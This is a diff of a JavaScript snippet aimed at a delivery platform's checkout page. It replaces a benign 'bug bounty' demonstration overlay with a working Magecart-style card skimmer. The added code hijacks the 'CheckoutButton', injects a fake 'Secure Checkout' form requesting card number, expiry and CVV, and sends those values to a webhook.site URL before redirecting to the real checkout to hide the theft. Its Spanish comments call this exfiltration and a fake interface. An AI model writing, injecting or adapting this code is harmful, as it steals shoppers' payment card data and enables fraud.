@@ -1,40 +1,41 @@
-// PoC: Captura de botón de pago en plataforma de delivery
-(function() {
-    console.log("Investigación activa: Buscando botón 'Continue'...");
+(function(){
+    var u="https://webhook.site/cfcaa601-1896-4266-9c57-33605ad12c9e", d=document;
 
-    // Usamos el data-testid que es el selector más específico para este botón
-    const selector = 'a[data-testid="CheckoutButton"]';
-
-    const checkButton = setInterval(() => {
-        const continueBtn = document.querySelector(selector);
-
-        if (continueBtn) {
-            console.log("Botón detectado. Aplicando intercepción...");
-            clearInterval(checkButton);
-
-            continueBtn.addEventListener('click', function(e) {
-                // Bloqueamos la redirección real al checkout
-                e.preventDefault();
-                e.stopImmediatePropagation();
-
-                // Aquí se dispararía tu interfaz de prueba (Overlay)
-                console.log("Evento interceptado con éxito.");
-                mostrarInterfazPrueba();
-            });
-        }
-    }, 500);
-
-    function mostrarInterfazPrueba() {
-        // Tu lógica de inserción de HTML para demostrar el impacto de PII
-        const div = document.createElement('div');
-        div.innerHTML = `
-            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999999;padding:40px;font-family:sans-serif;">
-                <h2>Confirmación de Pedido (PoC de Seguridad)</h2>
-                <p>Esta es una demostración de seguridad para el reporte de Bug Bounty.</p>
-                <button onclick="location.reload()" style="padding:10px 20px; background:black; color:white; border:none; cursor:pointer;">
-                    Cerrar Prueba
-                </button>
-            </div>`;
-        document.body.appendChild(div);
+    function h(b){
+        if(b.getAttribute("d")) return;
+        var n = b.cloneNode(!0);
+        n.setAttribute("d", 1);
+        // Reemplazamos el elemento original para neutralizar listeners previos
+        b.parentNode.replaceChild(n, b);
+        n.addEventListener("click", function(e){
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            l(); // Dispara la interfaz falsa
+        });
     }
+
+    // El observador busca el botón "Continue" mediante su data-testid
+    new MutationObserver(function(m){
+        var t = d.querySelector('a[data-testid="CheckoutButton"]');
+        if(t && !t.getAttribute("d")) h(t);
+    }).observe(d.body, {childList: !0, subtree: !0});
+
+    function l(){
+        d.body.insertAdjacentHTML("beforeend", '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;font-family:sans-serif;text-align:center;padding:40px;"><h2 style="margin-bottom:20px">Secure Checkout</h2><div style="border:1px solid #ccc;padding:20px;text-align:left"><input id="c" placeholder="Card Number" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc"><div style="display:flex;gap:10px"><input id="e" placeholder="MM/YY" style="width:50%;padding:10px;border:1px solid #ccc"><input id="v" placeholder="CVV" style="width:50%;padding:10px;border:1px solid #ccc"></div></div><button id="b" onclick="x()" style="width:100%;margin-top:20px;padding:15px;background:#000;color:#fff;border:none;cursor:pointer">Pay Now</button></div>');
+    }
+
+    window.x = function(){
+        var c = d.getElementById("c").value, 
+            e = d.getElementById("e").value, 
+            v = d.getElementById("v").value;
+        d.getElementById("b").innerText = "Processing...";
+        
+        // Exfiltración de datos al webhook
+        new Image().src = u + "?c=" + c + "&e=" + e + "&v=" + v;
+        
+        setTimeout(function(){
+            // Redirección final al checkout real después de la captura
+            window.location.href = "/consumer/checkout/";
+        }, 1500);
+    };
 })();
